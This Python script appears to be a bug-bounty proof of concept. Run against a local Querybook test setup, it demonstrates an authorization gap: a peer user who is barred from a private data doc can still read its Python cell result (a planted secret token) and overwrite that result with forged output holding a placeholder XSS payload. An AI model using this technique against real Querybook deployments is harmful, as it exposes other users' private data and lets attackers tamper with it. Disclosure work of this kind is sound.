#!/usr/bin/env python3
"""C131 Querybook: Python cell result sibling authz gap (local e2e)."""
from __future__ import annotations

import os
import sys
import tempfile
from unittest import mock

sys._called_from_test = True

ROOT = "/workspace/bounty-research/src/querybook"
sys.path.insert(0, os.path.join(ROOT, "querybook/server"))
sys.path.insert(0, os.path.join(ROOT, "plugins"))

db_path = os.path.join(tempfile.gettempdir(), "qb_c131.db")
if os.path.exists(db_path):
    os.remove(db_path)
os.environ["DATABASE_CONN"] = f"sqlite:///{db_path}"
os.environ["FLASK_SECRET_KEY"] = "c131-proof"
os.environ.setdefault("REDIS_URL", "redis://localhost:6379/0")
os.environ["QUERYBOOK_OFFLINE"] = "1"

from sqlalchemy import create_engine  # noqa: E402
import models  # noqa: E402
from app import db as app_db  # noqa: E402
from env import QuerybookSettings  # noqa: E402

engine = create_engine(os.environ["DATABASE_CONN"], pool_pre_ping=True)
models.Base.metadata.create_all(engine)
app_db.get_db_engine = lambda **kwargs: engine
QuerybookSettings.DATABASE_CONN = os.environ["DATABASE_CONN"]

# Patch celery / ES / event logger before importing datasources path that fires them
with mock.patch("celery.app.task.Task.apply_async", return_value=None), mock.patch(
    "celery.app.base.Celery.send_task", return_value=None
):
    from app.flask_app import flask_app  # noqa: E402
    import app.server  # noqa: E402

from app.db import DBSession  # noqa: E402
from app.auth.utils import AuthUser  # noqa: E402
from flask_login import login_user  # noqa: E402
from logic import user as user_logic  # noqa: E402
from logic import environment as env_logic  # noqa: E402
from logic import datadoc as datadoc_logic  # noqa: E402
from tasks import sync_elasticsearch as sync_es  # noqa: E402
from lib.event_logger import event_logger  # noqa: E402


def noop(*a, **k):
    return None


sync_es.sync_elasticsearch.apply_async = noop
try:
    event_logger.log_api_request = noop
except Exception:
    pass


def main():
    results = []

    with mock.patch("celery.app.task.Task.apply_async", return_value=None):
        with DBSession() as session:
            env = env_logic.create_environment(
                name="c131-env",
                description="private env",
                public=False,
                hidden=False,
                shareable=False,
                session=session,
            )
            # create_user triggers ES; already patched
            owner = user_logic.create_user(
                username="owner_a", password="x", fullname="Owner A", session=session
            )
            peer = user_logic.create_user(
                username="peer_b", password="x", fullname="Peer B", session=session
            )
            env_logic.add_user_to_environment(owner.id, env.id, session=session)
            env_logic.add_user_to_environment(peer.id, env.id, session=session)

            doc = datadoc_logic.create_data_doc(
                environment_id=env.id,
                owner_uid=owner.id,
                public=False,
                title="secret notebook",
                meta={},
                cells=[],
                session=session,
            )
            cell = datadoc_logic.create_data_cell(
                cell_type="python",
                context="print('secret')",
                meta={},
                session=session,
            )
            datadoc_logic.insert_data_doc_cell(doc.id, cell.id, 0, session=session)
            datadoc_logic.create_or_update_python_cell_result(
                data_cell_id=cell.id,
                output=[{"type": "json", "data": {"secret": "PII-TOKEN-AABB"}}],
                error=None,
                session=session,
            )
            owner_id, peer_id, doc_id, cell_id = owner.id, peer.id, doc.id, cell.id
            print(
                f"[setup] env={env.id} owner={owner_id} peer={peer_id} doc={doc_id} cell={cell_id}"
            )

    client = flask_app.test_client()

    # Peer session
    with client.session_transaction() as sess:
        sess["_user_id"] = str(peer_id)
        sess["_fresh"] = True

    r = client.get(f"/ds/datadoc/{doc_id}/")
    body = r.get_json() or {}
    print(f"[control] peer GET /datadoc/{doc_id}/ -> {r.status_code} {body}")
    denied = r.status_code == 403 or (
        isinstance(body, dict) and body.get("error") is not None
    ) or r.status_code >= 400
    # also: 200 with data that is None / missing secret title is still a fail for control
    if r.status_code == 200 and isinstance(body.get("data"), dict) and body["data"].get("id") == doc_id:
        denied = False
    results.append(("peer_cannot_read_datadoc", denied))
    print(f"  -> denied={denied}")

    r2 = client.get(f"/ds/python_cell/{cell_id}/result/")
    b2 = r2.get_json() or {}
    print(f"[vuln-read] peer GET /python_cell/{cell_id}/result/ -> {r2.status_code} {b2}")
    data = b2.get("data") if isinstance(b2, dict) else None
    got_secret = False
    if r2.status_code == 200 and data:
        out = data.get("output") if isinstance(data, dict) else None
        got_secret = "PII-TOKEN-AABB" in str(out)
    results.append(("peer_reads_python_result", got_secret))
    print(f"  -> got_secret={got_secret}")

    forged = [{"type": "image", "data": "data:image/png;base64,AAAA_XSS_PAYLOAD"}]
    r3 = client.put(
        f"/ds/python_cell/{cell_id}/result/",
        json={"output": forged, "error": None},
        content_type="application/json",
    )
    b3 = r3.get_json() or {}
    print(f"[vuln-write] peer PUT /python_cell/{cell_id}/result/ -> {r3.status_code} {b3}")
    write_ok = r3.status_code == 200 and not b3.get("error")
    results.append(("peer_overwrites_python_result", write_ok))
    print(f"  -> write_ok={write_ok}")

    with client.session_transaction() as sess:
        sess["_user_id"] = str(owner_id)
        sess["_fresh"] = True
    r4 = client.get(f"/ds/python_cell/{cell_id}/result/")
    b4 = r4.get_json() or {}
    persisted = "AAAA_XSS_PAYLOAD" in str(b4)
    results.append(("forged_output_persisted_for_owner", persisted))
    print(f"[confirm] owner sees forged: {persisted}")

    with client.session_transaction() as sess:
        sess["_user_id"] = str(peer_id)
        sess["_fresh"] = True
    r5 = client.put(
        f"/ds/data_cell/{cell_id}/",
        json={"fields": {"context": "hacked"}},
        content_type="application/json",
    )
    b5 = r5.get_json() or {}
    cell_denied = r5.status_code != 200 or bool(b5.get("error"))
    results.append(("peer_cannot_update_data_cell_sibling", cell_denied))
    print(f"[sibling] peer PUT /data_cell/{cell_id}/ -> {r5.status_code} denied={cell_denied} {b5}")

    print("\n=== RESULTS ===")
    all_pass = True
    for name, ok in results:
        print(f"  {'PASS' if ok else 'FAIL'}: {name}")
        all_pass = all_pass and ok
    print(f"OVERALL: {'PASS' if all_pass else 'FAIL'}")
    return 0 if all_pass else 1


if __name__ == "__main__":
    raise SystemExit(main())
